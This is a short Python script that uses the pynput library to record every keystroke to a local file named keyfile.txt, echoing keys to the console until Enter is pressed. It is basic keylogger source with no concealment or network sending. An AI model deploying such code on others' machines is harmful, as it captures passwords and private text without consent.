from pynput import keyboard

def keyPressed(key):
    print(str(key))

    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key)}]")
            print("Special key pressed:", key)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    
    listener.start()


    input("Press Enter to stop logging...")
